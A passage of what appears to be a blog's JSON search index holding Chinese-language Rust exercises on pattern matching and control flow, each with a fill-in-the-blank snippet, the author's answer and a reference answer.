show_message(msg: Message) &#123; match msg &#123; Message::Move&#123;x: a, y: b&#125; =&gt; &#123; // match Message::Move assert_eq!(a, 1); assert_eq!(b, 3); &#125;, Message::ChangeColor(_, g, b) =&gt; &#123; assert_eq!(g, 255); assert_eq!(b, 0); &#125; _ =&gt; println!(&quot;no data in these variants&quot;) &#125;&#125;","text":"match，matches！和if letmatch 🌟🌟 123456789101112131415161718// 填空enum Direction &#123; East, West, North, South,&#125;fn main() &#123; let dire = Direction::South; match dire &#123; Direction::East =&gt; println!(&quot;East&quot;), __ =&gt; &#123; // 在这里匹配 South 或 North println!(&quot;South or North&quot;); &#125;, _ =&gt; println!(__), &#125;;&#125; My Answer 12345678910111213141516171819// 填空enum Direction &#123; East, West, North, South,&#125;fn main() &#123; let dire = Direction::South; match dire &#123; Direction::East =&gt; println!(&quot;East&quot;), Direction::South | Direction::North =&gt; &#123; // 在这里匹配 South 或 North println!(&quot;South or North&quot;); &#125; _ =&gt; println!(&quot;other&quot;), &#125;;&#125; Answer 1234567891011121314fn main() &#123; let boolean = true; // fill the blank with an match expression: // // boolean = true =&gt; binary = 1 // boolean = false =&gt; binary = 0 let binary = match boolean &#123; true =&gt; 1, false =&gt; 0 &#125;; assert_eq!(binary, 1);&#125; 🌟🌟 match 是一个表达式，因此可以用在赋值语句中 1234567891011fn main() &#123; let boolean = true; // 使用 match 表达式填空，并满足以下条件 // // boolean = true =&gt; binary = 1 // boolean = false =&gt; binary = 0 let binary = __; assert_eq!(binary, 1);&#125; My Answer 1234567891011121314fn main() &#123; let boolean = true; // 使用 match 表达式填空，并满足以下条件 // // boolean = true =&gt; binary = 1 // boolean = false =&gt; binary = 0 let binary = match boolean&#123; true =&gt; 1, false =&gt; 0, &#125;; assert_eq!(binary, 1);&#125; Answer 1234567891011121314fn main() &#123; let boolean = true; // fill the blank with an match expression: // // boolean = true =&gt; binary = 1 // boolean = false =&gt; binary = 0 let binary = match boolean &#123; true =&gt; 1, false =&gt; 0 &#125;; assert_eq!(binary, 1);&#125; 🌟🌟 使用 match 匹配出枚举成员持有的值 123456789101112131415161718192021222324252627282930313233// 填空enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msgs = [ Message::Quit, Message::Move&#123;x:1, y:3&#125;, Message::ChangeColor(255,255,0) ]; for msg in msgs &#123; show_message(msg) &#125;&#125; fn show_message(msg: Message) &#123; match msg &#123; __ =&gt; &#123; // 这里匹配 Message::Move assert_eq!(a, 1); assert_eq!(b, 3); &#125;, Message::ChangeColor(_, g, b) =&gt; &#123; assert_eq!(g, __); assert_eq!(b, __); &#125; __ =&gt; println!(&quot;no data in these variants&quot;) &#125;&#125; My Answer 123456789101112131415161718192021222324252627282930313233// 填空enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msgs = [ Message::Quit, Message::Move&#123;x:1, y:3&#125;, Message::ChangeColor(255,255,0) ]; for msg in msgs &#123; show_message(msg) &#125;&#125; fn show_message(msg: Message) &#123; match msg &#123; Message::Move &#123;x:a, y:b&#125; =&gt; &#123; // 这里匹配 Message::Move assert_eq!(a, 1); assert_eq!(b, 3); &#125;, Message::ChangeColor(_, g, b) =&gt; &#123; assert_eq!(g, 255); assert_eq!(b, 0); &#125; __ =&gt; println!(&quot;no data in these variants&quot;) &#125;&#125; Answer 1234567891011121314151617181920212223242526272829303132enum Message &#123; Quit, Move &#123; x: i32, y: i32 &#125;, Write(String), ChangeColor(i32, i32, i32),&#125;fn main() &#123; let msgs = [ Message::Quit, Message::Move&#123;x:1, y:3&#125;, Message::ChangeColor(255,255,0) ]; for msg in msgs &#123; show_message(msg) &#125;&#125; fn show_message(msg: Message) &#123; match msg &#123; Message::Move&#123;x: a, y: b&#125; =&gt; &#123; // match Message::Move assert_eq!(a, 1); assert_eq!(b, 3); &#125;, Message::ChangeColor(_, g, b) =&gt; &#123; assert_eq!(g, 255); assert_eq!(b, 0); &#125; _ =&gt; println!(&quot;no data in these variants&quot;) &#125;&#125; matches!matches! 看起来像 match, 但是它可以做一些特别的事情 🌟🌟 12345678fn main() &#123; let alphabets = [&#x27;a&#x27;, &#x27;E&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;x&#x27;, &#x27;9&#x27; , &#x27;Y&#x27;]; // 使用 `matches` 填空 for ab in alphabets &#123; assert!(__) &#125;&#125; My Answer 12345678fn main() &#123; let alphabets = [&#x27;a&#x27;, &#x27;E&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;x&#x27;, &#x27;9&#x27; , &#x27;Y&#x27;]; // 使用 `matches` 填空 for ab in alphabets &#123; assert!(matches!(ab,&#x27;a&#x27;..=&#x27;z&#x27;|&#x27;A&#x27;..=&#x27;Z&#x27;|&#x27;0&#x27;..=&#x27;9&#x27;)); &#125;&#125; Answer 12345678fn main() &#123; let alphabets = [&#x27;a&#x27;, &#x27;E&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;x&#x27;, &#x27;9&#x27; , &#x27;Y&#x27;]; // fill the blank with `matches!` to make the code work for ab in alphabets &#123; assert!(matches!(ab, &#x27;a&#x27;..=&#x27;z&#x27; | &#x27;A&#x27;..=&#x27;Z&#x27; | &#x27;0&#x27;..=&#x27;9&#x27;)) &#125;&#125; 🌟🌟 1234567891011121314151617enum MyEnum &#123; Foo, Bar&#125;fn main() &#123; let mut count = 0; let v = vec![MyEnum::Foo,MyEnum::Bar,MyEnum::Foo]; for e in v &#123; if e == MyEnum::Foo &#123; // 修复错误，只能修改本行代码 count += 1; &#125; &#125; assert_eq!(count, 2);&#125; My Answer 1234567891011121314151617enum MyEnum &#123; Foo, Bar&#125;fn main() &#123; let mut count = 0; let v = vec![MyEnum::Foo,MyEnum::Bar,MyEnum::Foo]; for e in v &#123; if matches!(e,MyEnum::Foo) &#123; // 修复错误，只能修改本行代码 count += 1; &#125; &#125; assert_eq!(count, 2);&#125; Answer 1234567891011121314151617enum MyEnum &#123; Foo, Bar&#125;fn main() &#123; let mut count = 0; let v = vec![MyEnum::Foo,MyEnum::Bar,MyEnum::Foo]; for e in v &#123; if matches!(e , MyEnum::Foo) &#123; // fix the error with changing only this line count += 1; &#125; &#125; assert_eq!(count, 2);&#125; if let在有些时候, 使用 match 匹配枚举有些太重了，此时 if let 就非常适合. 🌟 1234567891011fn main() &#123; let o = Some(7); // 移除整个 `match` 语句块，使用 `if let` 替代 match o &#123; Some(i) =&gt; &#123; println!(&quot;This is a really long string and `&#123;:?&#125;`&quot;, i); &#125; _ =&gt; &#123;&#125; &#125;;&#125; My Answer 12345678fn main() &#123; let o = Some(7); if let Some(i) = o &#123; println!(&quot;This is a really long string and `&#123;:?&#125;`&quot;, i); &#125; // 移除整个 `match` 语句块，使用 `if let` 替代&#125; Answer 1234567fn main() &#123; let o = Some(7); if let Some(i) = o &#123; println!(&quot;This is a really long string and `&#123;:?&#125;`&quot;, i); &#125;&#125; 🌟🌟 123456789101112// 填空enum Foo &#123; Bar(u8)&#125;fn main() &#123; let a = Foo::Bar(1); __ &#123; println!(&quot;foobar 持有的值是: &#123;&#125;&quot;, i); &#125;&#125; My Answer 12345678fn main() &#123; let o = Some(7); if let Some(i) = o &#123; println!(&quot;This is a really long string and `&#123;:?&#125;`&quot;, i); &#125; // 移除整个 `match` 语句块，使用 `if let` 替代&#125; Answer 1234567fn main() &#123; let o = Some(7); if let Some(i) = o &#123; println!(&quot;This is a really long string and `&#123;:?&#125;`&quot;, i); &#125;&#125; 🌟🌟 123456789101112// 填空enum Foo &#123; Bar(u8)&#125;fn main() &#123; let a = Foo::Bar(1); __ &#123; println!(&quot;foobar 持有的值是: &#123;&#125;&quot;, i); &#125;&#125; My Answer 123456789101112// 填空enum Foo &#123; Bar(u8)&#125;fn main() &#123; let a = Foo::Bar(1); if let Foo::Bar(i) = a &#123; println!(&quot;foobar 持有的值是: &#123;&#125;&quot;, i); &#125;&#125; Answer 1234567891011enum Foo &#123; Bar(u8)&#125;fn main() &#123; let a = Foo::Bar(1); if let Foo::Bar(i) = a &#123; println!(&quot;foobar holds the value: &#123;&#125;&quot;, i); &#125;&#125; 🌟🌟 123456789101112131415161718enum Foo &#123; Bar, Baz, Qux(u32)&#125;fn main() &#123; let a = Foo::Qux(10); // 移除以下代码，使用 `match` 代替 if let Foo::Bar = a &#123; println!(&quot;match foo::bar&quot;) &#125; else if let Foo::Baz = a &#123; println!(&quot;match foo::baz&quot;) &#125; else &#123; println!(&quot;match others&quot;) &#125;&#125; My Answer 12345678910111213141516enum Foo &#123; Bar, Baz, Qux(u32)&#125;fn main() &#123; let a = Foo::Qux(10); // 移除以下代码，使用 `match` 代替 match a &#123; Foo::Bar =&gt; println!(&quot;match foo::bar&quot;), Foo::Baz =&gt; println!(&quot;match foo::baz&quot;), _ =&gt; println!(&quot;match others&quot;) &#125;&#125; Answer 123456789101112131415enum Foo &#123; Bar, Baz, Qux(u32)&#125;fn main() &#123; let a = Foo::Qux(10); match a &#123; Foo::Bar =&gt; println!(&quot;match foo::bar&quot;), Foo::Baz =&gt; println!(&quot;match foo::baz&quot;), _ =&gt; println!(&quot;match others&quot;) &#125;&#125; 变量遮蔽（shadowing） 🌟🌟 12345678910111213// 就地修复错误fn main() &#123; let age = Some(30); if let Some(age) = age &#123; // 创建一个新的变量，该变量与之前的 `age` 变量同名 assert_eq!(age, Some(30)); &#125; // 新的 `age` 变量在这里超出作用域 match age &#123; // `match` 也能实现变量遮蔽 Some(age) =&gt; println!(&quot;age 是一个新的变量，它的值是 &#123;&#125;&quot;,age), _ =&gt; () &#125; &#125; My Answer 12345678910111213// 就地修复错误fn main() &#123; let age = Some(30); if let Some(age) = age &#123; // 创建一个新的变量，该变量与之前的 `age` 变量同名 assert_eq!(age, 30); &#125; // 新的 `age` 变量在这里超出作用域 match age &#123; // `match` 也能实现变量遮蔽 Some(age) =&gt; println!(&quot;age 是一个新的变量，它的值是 &#123;&#125;&quot;,age), _ =&gt; () &#125; &#125; Answer 123456789101112fn main() &#123; let age = Some(30); if let Some(age) = age &#123; // create a new variable with the same name as previous `age` assert_eq!(age, 30); &#125; // the new variable `age` goes out of scope here match age &#123; // match can also introduce a new shadowed variable Some(age) =&gt; println!(&quot;age is a new variable, it&#x27;s value is &#123;&#125;&quot;,age), _ =&gt; () &#125; &#125; 模式 🌟🌟 使用 | 可以匹配多个值, 而使用 ..= 可以匹配一个闭区间的数值序列 12345678910111213141516fn main() &#123;&#125;fn match_number(n: i32) &#123; match n &#123; // 匹配一个单独的值 1 =&gt; println!(&quot;One!&quot;), // 使用 `|` 填空，不要使用 `..` 或 `..=` __ =&gt; println!(&quot;match 2 -&gt; 5&quot;), // 匹配一个闭区间的数值序列 6..=10 =&gt; &#123; println!(&quot;match 6 -&gt; 10&quot;) &#125;, _ =&gt; &#123; println!(&quot;match 11 -&gt; +infinite&quot;) &#125; &#125;&#125; My Answer 123456789101112131415161718fn main() &#123; match_number(3);&#125;fn match_number(n: i32) &#123; match n &#123; // 匹配一个单独的值 1 =&gt; println!(&quot;One!&quot;), // 使用 `|` 填空，不要使用 `..` 或 `..=` 2|3|4|5 =&gt; println!(&quot;match 2 -&gt; 5&quot;), // 匹配一个闭区间的数值序列 6..=10 =&gt; &#123; println!(&quot;match 6 -&gt; 10&quot;) &#125;, _ =&gt; &#123; println!(&quot;match 11 -&gt; +infinite&quot;) &#125; &#125;&#125; Answer 12345678910111213141516fn main() &#123;&#125;fn match_number(n: i32) &#123; match n &#123; // match a single value 1 =&gt; println!(&quot;One!&quot;), // fill in the blank with `|`, DON&#x27;T use `..` ofr `..=` 2 | 3 | 4 | 5 =&gt; println!(&quot;match 2 -&gt; 5&quot;), // match an inclusive range 6..=10 =&gt; &#123; println!(&quot;match 6 -&gt; 10&quot;) &#125;, _ =&gt; &#123; println!(&quot;match 11 -&gt; +infinite&quot;) &#125; &#125;&#125; 🌟🌟🌟 @ 操作符可以让我们将一个与模式相匹配的值绑定到新的变量上 12345678910111213141516struct Point &#123; x: i32, y: i32,&#125;fn main() &#123; // 填空，让 p 匹配第二个分支 let p = Point &#123; x: __, y: __ &#125;; match p &#123; Point &#123; x, y: 0 &#125; =&gt; println!(&quot;On the x axis at &#123;&#125;&quot;, x), // 第二个分支 Point &#123; x: 0..=5, y: y@ (10 | 20 | 30) &#125; =&gt; println!(&quot;On the y axis at &#123;&#125;&quot;, y), Point &#123; x, y &#125; =&gt; println!(&quot;On neither axis: (&#123;&#125;, &#123;&#125;)&quot;, x, y), &#125;&#125; My Answer 12345678910111213141516struct Point &#123; x: i32, y: i32,&#125;fn main() &#123; // 填空，让 p 匹配第二个分支 let p = Point &#123; x: 0, y: 20 &#125;; match p &#123; Point &#123; x, y: 0 &#125; =&gt; println!(&quot;On the x axis at &#123;&#125;&quot;, x), // 第二个分支 Point &#123; x: 0..=5, y: y@ (10 | 20 | 30) &#125; =&gt; println!(&quot;On the y axis at &#123;&#125;&quot;, y), Point &#123; x, y &#125; =&gt; println!(&quot;On neither axis: (&#123;&#125;, &#123;&#125;)&quot;, x, y), &#125;&#125; Answer 12345678910111213141516struct Point &#123; x: i32, y: i32,&#125;fn main() &#123; // fill in the blank to let p match the second arm let p = Point &#123; x: 2, y: 20 &#125;; // x can be [0, 5], y can be 10 20 or 30 match p &#123; Point &#123; x, y: 0 &#125; =&gt; println!(&quot;On the x axis at &#123;&#125;&quot;, x), // second arm Point &#123; x: 0..=5, y: y@ (10 | 20 | 30) &#125; =&gt; println!(&quot;On the y axis at &#123;&#125;&quot;, y), Point &#123; x, y &#125; =&gt; println!(&quot;On neither axis: (&#123;&#125;, &#123;&#125;)&quot;, x, y), &#125;&#125; 🌟🌟🌟 123456789101112131415161718// 修复错误enum Message &#123; Hello &#123; id: i32 &#125;,&#125;fn main() &#123; let msg = Message::Hello &#123; id: 5 &#125;; match msg &#123; Message::Hello &#123; id: 3..=7, &#125; =&gt; println!(&quot;id 值的范围在 [3, 7] 之间: &#123;&#125;&quot;, id), Message::Hello &#123; id: newid@10 | 11 | 12 &#125; =&gt; &#123; println!(&quot;id 值的范围在 [10, 12] 之间: &#123;&#125;&quot;, newid) &#125; Message::Hello &#123; id &#125; =&gt; println!(&quot;Found some other id: &#123;&#125;&quot;, id), &#125;&#125; My Answer 123456789101112131415161718// 修复错误enum Message &#123; Hello &#123; id: i32 &#125;,&#125;fn main() &#123; let msg = Message::Hello &#123; id: 5 &#125;; match msg &#123; Message::Hello &#123; id: id@3..=7, &#125; =&gt; println!(&quot;id 值的范围在 [3, 7] 之间: &#123;&#125;&quot;, id), Message::Hello &#123; id: newid@(10 | 11 | 12) &#125; =&gt; &#123; println!(&quot;id 值的范围在 [10, 12] 之间: &#123;&#125;&quot;, newid) &#125; Message::Hello &#123; id &#125; =&gt; println!(&quot;Found some other id: &#123;&#125;&quot;, id), &#125;&#125; Answer 1234567891011121314151617enum Message &#123; Hello &#123; id: i32 &#125;,&#125;fn main() &#123; let msg = Message::Hello &#123; id: 5 &#125;; match msg &#123; Message::Hello &#123; id: id@3..=7, &#125; =&gt; println!(&quot;Found an id in range [3, 7]: &#123;&#125;&quot;, id), Message::Hello &#123; id: newid@(10 | 11 | 12) &#125; =&gt; &#123; println!(&quot;Found an id in another range [10, 12]: &#123;&#125;&quot;, newid) &#125; Message::Hello &#123; id &#125; =&gt; println!(&quot;Found some other id: &#123;&#125;&quot;, id), &#125;&#125; 🌟🌟 匹配守卫（match guard）是一个位于 match 分支模式之后的额外 if 条件，它能为分支模式提供更进一步的匹配条件。 12345678910// 填空让代码工作，必须使用 `split`fn main() &#123; let num = Some(4); let split = 5; match num &#123; Some(x) __ =&gt; assert!(x &lt; split), Some(x) =&gt; assert!(x &gt;= split), None =&gt; (), &#125;&#125; My Answer 12345678910// 填空让代码工作，必须使用 `split`fn main() &#123; let num = Some(4); let split = 5; match num &#123; Some(x) if x &lt; split =&gt; assert!(x &lt; split), Some(x) =&gt; assert!(x &gt;= split), None =&gt; (), &#125;&#125; Answer 123456789fn main() &#123; let num = Some(4); let split = 5; match num &#123; Some(x) if x &lt; split =&gt; assert!(x &lt; split), Some(x) =&gt; assert!(x &gt;= split), None =&gt; (), &#125;&#125; 🌟🌟🌟 使用 .. 忽略一部分值 1234567891011// 填空，让代码工作fn main() &#123; let numbers = (2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048); match numbers &#123; __ =&gt; &#123; assert_eq!(first, 2); assert_eq!(last, 2048); &#125; &#125;&#125; My Answer 1234567891011// 填空，让代码工作fn main() &#123; let numbers = (2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048); match numbers &#123; (first,..,last) =&gt; &#123; assert_eq!(first, 2); assert_eq!(last, 2048); &#125; &#125;&#125; Answer 12345678910fn main() &#123; let numbers = (2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048); match numbers &#123; (first,..,last) =&gt; &#123; assert_eq!(first, 2); assert_eq!(last, 2048); &#125; &#125;&#125; 🌟🌟 使用模式 &amp;mut V 去匹配一个可变引用时，你需要格外小心，因为匹配出来的 V 是一个值，而不是可变引用 12345678910// 修复错误，尽量少地修改代码// 不要移除任何代码行fn main() &#123; let mut v = String::from(&quot;hello,&quot;); let r = &amp;mut v; match r &#123; &amp;mut value =&gt; value.push_str(&quot; world!&quot;) &#125;&#125; My Answer 12345678910// 修复错误，尽量少地修改代码// 不要移除任何代码行fn main() &#123; let mut v = String::from(&quot;hello,&quot;); let r = &amp;mut v; match r &#123; value =&gt; value.push_str(&quot; world!&quot;) &#125;&#125; Answer 123456789fn main() &#123; let mut v = String::from(&quot;hello,&quot;); let r = &amp;mut v; match r &#123; // The type of value is &amp;mut String value =&gt; value.push_str(&quot; world!&quot;) &#125;&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习5 流程控制","slug":"Rust学习-练习5-流程控制","date":"2023-09-05T13:58:13.000Z","updated":"2023-09-10T07:42:49.702Z","comments":true,"path":"2023/09/05/Rust学习-练习5-流程控制/","link":"","permalink":"http://example.com/2023/09/05/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A05-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/","excerpt":"if&#x2F;else 🌟 123456789101112// 填空fn main() &#123; let n = 5; if n &lt; 0 &#123; println!(&quot;&#123;&#125; is negative&quot;, n); &#125; __ n &gt; 0 &#123; println!(&quot;&#123;&#125; is positive&quot;, n); &#125; __ &#123; println!(&quot;&#123;&#125; is zero&quot;, n); &#125;&#125; My Answer 123456789101112// 填空fn main() &#123; let n = 5; if n &lt; 0 &#123; println!(&quot;&#123;&#125; is negative&quot;, n); &#125; else if n &gt; 0 &#123; println!(&quot;&#123;&#125; is positive&quot;, n); &#125; else &#123; println!(&quot;&#123;&#125; is zero&quot;, n); &#125;&#125; Answer 1234567891011fn main() &#123; let n = 5; if n &lt; 0 &#123; println!(&quot;&#123;&#125; is negative&quot;, n); &#125; else if n &gt; 0 &#123; println!(&quot;&#123;&#125; is positive&quot;, n); &#125; else &#123; println!(&quot;&#123;&#125; is zero&quot;, n); &#125;&#125; 🌟🌟 if&#x2F;else 可以用作表达式来进行赋值 1234567891011121314151617// 修复错误fn main() &#123; let n = 5; let big_n = if n &lt; 10 &amp;&amp; n &gt; -10 &#123; println!(&quot; 数字太小，先增加 10 倍再说&quot;); 10 * n &#125; else &#123; println!(&quot;数字太大，我们得让它减半&quot;); n / 2.0 ; &#125; println!(&quot;&#123;&#125; -&gt; &#123;&#125;&quot;, n, big_n);&#125; My Answer 1234567891011121314151617// 修复错误fn main() &#123; let n = 5; let big_n = if n &lt; 10 &amp;&amp; n &gt; -10 &#123; println!(&quot; 数字太小，先增加 10 倍再说&quot;); 10 * n &#125; else &#123; println!(&quot;数字太大，我们得让它减半&quot;); n / 2 &#125;; println!(&quot;&#123;&#125; -&gt; &#123;&#125;&quot;, n, big_n);&#125; 1 Answer 12345678910111213141516fn main() &#123; let n = 5; let big_n = if n &lt; 10 &amp;&amp; n &gt; -10 &#123; println!(&quot;, and is a small number, increase ten-fold&quot;); 10 * n &#125; else &#123; println!(&quot;, and is a big number, halve the number&quot;); n / 2 &#125;; println!(&quot;&#123;&#125; -&gt; &#123;&#125;&quot;, n, big_n);&#125;","text":"if&#x2F;else 🌟 123456789101112// 填空fn main() &#123; let n = 5; if n &lt; 0 &#123; println!(&quot;&#123;&#125; is negative&quot;, n); &#125; __ n &gt; 0 &#123; println!(&quot;&#123;&#125; is positive&quot;, n); &#125; __ &#123; println!(&quot;&#123;&#125; is zero&quot;, n); &#125;&#125; My Answer 123456789101112// 填空fn main() &#123; let n = 5; if n &lt; 0 &#123; println!(&quot;&#123;&#125; is negative&quot;, n); &#125; else if n &gt; 0 &#123; println!(&quot;&#123;&#125; is positive&quot;, n); &#125; else &#123; println!(&quot;&#123;&#125; is zero&quot;, n); &#125;&#125; Answer 1234567891011fn main() &#123; let n = 5; if n &lt; 0 &#123; println!(&quot;&#123;&#125; is negative&quot;, n); &#125; else if n &gt; 0 &#123; println!(&quot;&#123;&#125; is positive&quot;, n); &#125; else &#123; println!(&quot;&#123;&#125; is zero&quot;, n); &#125;&#125; 🌟🌟 if&#x2F;else 可以用作表达式来进行赋值 1234567891011121314151617// 修复错误fn main() &#123; let n = 5; let big_n = if n &lt; 10 &amp;&amp; n &gt; -10 &#123; println!(&quot; 数字太小，先增加 10 倍再说&quot;); 10 * n &#125; else &#123; println!(&quot;数字太大，我们得让它减半&quot;); n / 2.0 ; &#125; println!(&quot;&#123;&#125; -&gt; &#123;&#125;&quot;, n, big_n);&#125; My Answer 1234567891011121314151617// 修复错误fn main() &#123; let n = 5; let big_n = if n &lt; 10 &amp;&amp; n &gt; -10 &#123; println!(&quot; 数字太小，先增加 10 倍再说&quot;); 10 * n &#125; else &#123; println!(&quot;数字太大，我们得让它减半&quot;); n / 2 &#125;; println!(&quot;&#123;&#125; -&gt; &#123;&#125;&quot;, n, big_n);&#125; 1 Answer 12345678910111213141516fn main() &#123; let n = 5; let big_n = if n &lt; 10 &amp;&amp; n &gt; -10 &#123; println!(&quot;, and is a small number, increase ten-fold&quot;); 10 * n &#125; else &#123; println!(&quot;, and is a big number, halve the number&quot;); n / 2 &#125;; println!(&quot;&#123;&#125; -&gt; &#123;&#125;&quot;, n, big_n);&#125; for 🌟 for in 可以用于迭代一个迭代器，例如序列 a..b. 1234567fn main() &#123; for n in 1..=100 &#123; if n == 100 &#123; panic!(&quot;NEVER LET THIS RUN&quot;) &#125; &#125;&#125; My Answer 1234567fn main() &#123; for n in 1..100 &#123; if n == 100 &#123; panic!(&quot;NEVER LET THIS RUN&quot;) &#125; &#125;&#125; Answer 1234567fn main() &#123; for n in 1..100 &#123; if n == 100 &#123; panic!(&quot;NEVER LET THIS RUN&quot;) &#125; &#125;&#125; 🌟🌟 1234567891011121314151617// 修复错误，不要新增或删除代码行fn main() &#123; let names = [String::from(&quot;liming&quot;),String::from(&quot;hanmeimei&quot;)]; for name in names &#123; // do something with name... &#125; println!(&quot;&#123;:?&#125;&quot;, names); let numbers = [1, 2, 3]; // numbers中的元素实现了 Copy，因此无需转移所有权 for n in numbers &#123; // do something with name... &#125; println!(&quot;&#123;:?&#125;&quot;, numbers);&#125; My Answer 1234567891011121314151617// 修复错误，不要新增或删除代码行fn main() &#123; let names = [String::from(&quot;liming&quot;),String::from(&quot;hanmeimei&quot;)]; for name in &amp;names &#123; // do something with name... &#125; println!(&quot;&#123;:?&#125;&quot;, names); let numbers = [1, 2, 3]; // numbers中的元素实现了 Copy，因此无需转移所有权 for n in numbers &#123; // do something with name... &#125; println!(&quot;&#123;:?&#125;&quot;, numbers);&#125; Answer 1234567891011121314151617// 修复错误，不要新增或删除代码行fn main() &#123; let names = [String::from(&quot;liming&quot;),String::from(&quot;hanmeimei&quot;)]; for name in &amp;names &#123; // do something with name... &#125; println!(&quot;&#123;:?&#125;&quot;, names); let numbers = [1, 2, 3]; // numbers中的元素实现了 Copy，因此无需转移所有权 for n in numbers &#123; // do something with name... &#125; println!(&quot;&#123;:?&#125;&quot;, numbers);&#125; 🌟 12345678fn main() &#123; let a = [4,3,2,1]; // 通过索引和值的方式迭代数组 `a` for (i,v) in a.__ &#123; println!(&quot;第&#123;&#125;个元素是&#123;&#125;&quot;,i+1,v); &#125;&#125; My Answer 12345678fn main() &#123; let a = [4,3,2,1]; // 通过索引和值的方式迭代数组 `a` for (i,v) in a.iter().enumerate() &#123; println!(&quot;第&#123;&#125;个元素是&#123;&#125;&quot;,i+1,v); &#125;&#125; Answer 12345678fn main() &#123; let a = [4, 3, 2, 1]; // iterate the indexing and value in &#x27;a&#x27; for (i, v) in a.iter().enumerate() &#123; println!(&quot;The &#123;&#125;th element is &#123;&#125;&quot;, i + 1, v); &#125;&#125; while 🌟🌟 当条件为 true 时，while 将一直循环 12345678910111213141516// 填空，让最后一行的 println! 工作 !fn main() &#123; // 一个计数值 let mut n = 1; // 当条件为真时，不停的循环 while n __ 10 &#123; if n % 15 == 0 &#123; println!(&quot;fizzbuzz&quot;); &#125; else if n % 3 == 0 &#123; println!(&quot;fizz&quot;); &#125; else if n % 5 == 0 &#123; println!(&quot;buzz&quot;); &#125; else &#123; println!(&quot;&#123;&#125;&quot;, n); &#125; __; &#125; println!(&quot;n 的值是 &#123;&#125;, 循环结束&quot;,n); } 123456789101112131415161718192021222324252627- My Answer ```rust // 填空，让最后一行的 println! 工作 ! fn main() &#123; // 一个计数值 let mut n = 1; // 当条件为真时，不停的循环 while n &lt;= 10 &#123; if n % 15 == 0 &#123; println!(&quot;fizzbuzz&quot;); &#125; else if n % 3 == 0 &#123; println!(&quot;fizz&quot;); &#125; else if n % 5 == 0 &#123; println!(&quot;buzz&quot;); &#125; else &#123; println!(&quot;&#123;&#125;&quot;, n); &#125; n = n+1; &#125; println!(&quot;n 的值是 &#123;&#125;, 循环结束&quot;,n); &#125; Answer 123456789101112131415fn main() &#123; // A counter variable let mut n = 1; // Loop while the condition is true while n &lt; 10 &#123; if n % 15 == 0 &#123; println!(&quot;fizzbuzz&quot;); &#125; else if n % 3 == 0 &#123; println!(&quot;fizz&quot;); &#125; else if n % 5 == 0 &#123; println!(&quot;buzz&quot;); &#125; else &#123; println!(&quot;&#123;&#125;&quot;, n); &#125; n += 1; &#125; println!(&quot;n reached &#123;&#125;, soloop is over&quot;, n); } 123456789101112131415161718# continue and break7. 🌟 使用 `break` 可以跳出循环```rust// 填空，不要修改其它代码fn main() &#123; let mut n = 0; for i in 0..=100 &#123; if n == 66 &#123; __ &#125; n += 1; &#125; assert_eq!(n, 66);&#125; My Answer 123456789101112// 填空，不要修改其它代码fn main() &#123; let mut n = 0; for i in 0..=100 &#123; if n == 66 &#123; break; &#125; n += 1; &#125; assert_eq!(n, 66);&#125; Answer 1234567891011fn main() &#123; let mut n = 0; for i in 0..=100 &#123; if n == 66 &#123; break; &#125; n += 1; &#125; assert_eq!(n, 66);&#125; 🌟🌟 continue 会结束当次循环并立即开始下一次循环 1234567891011121314// 填空，不要修改其它代码fn main() &#123; let mut n = 0; for i in 0..=100 &#123; if n != 66 &#123; n+=1; __; &#125; __ &#125; assert_eq!(n, 66);&#125; My Answer 1234567891011121314// 填空，不要修改其它代码fn main() &#123; let mut n = 0; for i in 0..=100 &#123; if n != 66 &#123; n+=1; continue; &#125; break; &#125; assert_eq!(n, 66);&#125; Answer 12345678910111213fn main() &#123; let mut n = 0; for i in 0..=100 &#123; if n != 66 &#123; n += 1; continue; &#125; break; &#125; assert_eq!(n, 66);&#125; loop 🌟🌟 loop 一般都需要配合 break 或 continue 一起使用。 12345678910111213141516171819202122232425262728// 填空，不要修改其它代码fn main() &#123; let mut count = 0u32; println!(&quot;Let&#x27;s count until infinity!&quot;); // 无限循环 loop &#123; count += 1; if count == 3 &#123; println!(&quot;three&quot;); // 跳过当此循环的剩余代码 __; &#125; println!(&quot;&#123;&#125;&quot;, count); if count == 5 &#123; println!(&quot;OK, that&#x27;s enough&quot;); __; &#125; &#125; assert_eq!(count, 5);&#125; My Answer 12345678910111213141516171819202122232425262728// 填空，不要修改其它代码fn main() &#123; let mut count = 0u32; println!(&quot;Let&#x27;s count until infinity!&quot;); // 无限循环 loop &#123; count += 1; if count == 3 &#123; println!(&quot;three&quot;); // 跳过当此循环的剩余代码 continue; &#125; println!(&quot;&#123;&#125;&quot;, count); if count == 5 &#123; println!(&quot;OK, that&#x27;s enough&quot;); break; &#125; &#125; assert_eq!(count, 5);&#125; Answer 123456789101112131415161718192021222324252627fn main() &#123; let mut count = 0u32; println!(&quot;Let&#x27;s count until infinity!&quot;); // Infinite loop loop &#123; count += 1; if count == 3 &#123; println!(&quot;three&quot;); // Skip the rest of this iteration continue; &#125; println!(&quot;&#123;&#125;&quot;, count); if count == 5 &#123; println!(&quot;OK, that&#x27;s enough&quot;); break; &#125; &#125; assert_eq!(count, 5);&#125; 🌟🌟 loop 是一个表达式，因此我们可以配合 break 来返回一个值 1234567891011121314// 填空fn main() &#123; 